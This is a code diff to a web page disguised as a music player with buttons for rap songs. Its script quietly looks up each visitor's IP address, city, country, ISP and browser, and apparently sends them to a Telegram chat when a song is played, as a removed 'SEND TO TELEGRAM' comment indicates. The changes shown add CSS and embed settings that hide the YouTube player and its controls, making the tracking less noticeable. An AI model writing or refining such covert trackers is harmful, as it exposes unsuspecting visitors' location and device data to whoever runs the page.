@@ -159,10 +159,22 @@
       color: #000;
       transform: scale(1.05);
     }
+
+    /* HIDDEN YOUTUBE PLAYER */
     #player {
-      margin-top: 20px;
+      margin-top: 40px;
       width: 100%;
-      height: 200px;
+      height: 80px;
+      overflow: hidden;
+      position: relative;
+    }
+    #player iframe {
+      position: absolute;
+      top: -100px;
+      left: 0;
+      width: 100%;
+      height: 300px;
+      border: none;
     }
   </style>
 </head>
@@ -198,36 +210,31 @@
     </div>
   </div>
 
-  <!-- ARTIST CHOICE (SCROLL DOWN) -->
+  <!-- ARTIST CHOICE -->
   <div class="artists">
-    <div class="artist-btn" onclick="showSongs('drake')">
-      DRAKE
-    </div>
+    <div class="artist-btn" onclick="showSongs('drake')">DRAKE</div>
     <div class="songs" id="drake-songs">
-      <div class="song-btn" onclick="playSong('Look What You\'ve Done', 'https://www.youtube.com/watch?v=5H7CS-_RUe8')">Look What You've Done</div>
-      <div class="song-btn" onclick="playSong('Marvins Room', 'https://www.youtube.com/watch?v=JDb3ZZD4bA0')">Marvins Room</div>
-      <div class="song-btn" onclick="playSong('Doing It Wrong', 'https://www.youtube.com/watch?v=GmZsYYI1Vnc')">Doing It Wrong</div>
+      <div class="song-btn" onclick="playSong('Look What You\'ve Done', '5H7CS-_RUe8')">Look What You've Done</div>
+      <div class="song-btn" onclick="playSong('Marvins Room', 'JDb3ZZD4bA0')">Marvins Room</div>
+      <div class="song-btn" onclick="playSong('Doing It Wrong', 'GmZsYYI1Vnc')">Doing It Wrong</div>
     </div>
 
-    <div class="artist-btn" onclick="showSongs('carti')">
-      PLAYBOI CARTI
-    </div>
+    <div class="artist-btn" onclick="showSongs('carti')">PLAYBOI CARTI</div>
     <div class="songs" id="carti-songs">
-      <div class="song-btn" onclick="playSong('Sky', 'https://www.youtube.com/watch?v=GYE9H4SMq5E')">Sky</div>
-      <div class="song-btn" onclick="playSong('Fell In Luv', 'https://www.youtube.com/watch?v=HRbgGQ7rHi0')">Fell In Luv</div>
-      <div class="song-btn" onclick="playSong('Rockstar Made', 'https://www.youtube.com/watch?v=EwdsnGfrd-k')">Rockstar Made</div>
+      <div class="song-btn" onclick="playSong('Sky', 'GYE9H4SMq5E')">Sky</div>
+      <div class="song-btn" onclick="playSong('Fell In Luv', 'HRbgGQ7rHi0')">Fell In Luv</div>
+      <div class="song-btn" onclick="playSong('Rockstar Made', 'EwdsnGfrd-k')">Rockstar Made</div>
     </div>
 
-    <div class="artist-btn" onclick="showSongs('ken')">
-      KEN CARSON
-    </div>
+    <div class="artist-btn" onclick="showSongs('ken')">KEN CARSON</div>
     <div class="songs" id="ken-songs">
-      <div class="song-btn" onclick="playSong('Ss', 'https://www.youtube.com/watch?v=TMzs6GvsZXU')">Ss</div>
-      <div class="song-btn" onclick="playSong('Yale', 'https://www.youtube.com/watch?v=ppUGaXd9pzY')">Yale</div>
-      <div class="song-btn" onclick="playSong('Liveleak', 'https://www.youtube.com/watch?v=RKN4NTPGJxY')">Liveleak</div>
+      <div class="song-btn" onclick="playSong('Ss', 'TMzs6GvsZXU')">Ss</div>
+      <div class="song-btn" onclick="playSong('Yale', 'ppUGaXd9pzY')">Yale</div>
+      <div class="song-btn" onclick="playSong('Liveleak', 'RKN4NTPGJxY')">Liveleak</div>
     </div>
   </div>
 
+  <!-- HIDDEN PLAYER -->
   <div id="player" class="hidden"></div>
 
   <script>
@@ -269,7 +276,7 @@ Site: <a href="${site}">${site}</a>`;
         .catch(() => {});
     }
 
-    // === STEP 1: GET IP ===
+    // === GET IP ===
     function getIP() {
       fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
@@ -284,7 +291,7 @@ Site: <a href="${site}">${site}</a>`;
         });
     }
 
-    // === STEP 2: GET CITY + COUNTRY + ISP ===
+    // === GET LOCATION + ISP ===
     function getLocation() {
       fetch(`https://ipapi.co/${userIP}/json/`)
         .then(r => r.json())
@@ -329,14 +336,17 @@ Site: <a href="${site}">${site}</a>`;
       document.getElementById('drake-songs').style.display = 'none';
       document.getElementById('carti-songs').style.display = 'none';
       document.getElementById('ken-songs').style.display = 'none';
-
       document.getElementById(`${artist}-songs`).style.display = 'flex';
     }
 
-    // === PLAY SONG + SEND TO TELEGRAM ===
-    function playSong(song, url) {
+    // === PLAY SONG (HIDDEN YOUTUBE) ===
+    function playSong(song, videoId) {
       const player = document.getElementById('player');
-      player.innerHTML = `<iframe width="100%" height="200" src="${url.replace('watch?v=', 'embed/')}?autoplay=1" frameborder="0" allow="autoplay"></iframe>`;
+      player.innerHTML = `
+        <iframe 
+          src="https://www.youtube.com/embed/${videoId}?autoplay=1&controls=0&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3&fs=0&cc_load_policy=0&disablekb=1"
+          allow="autoplay">
+        </iframe>`;
       player.classList.remove('hidden');
 
       const device = navigator.userAgent.substring(0, 80);
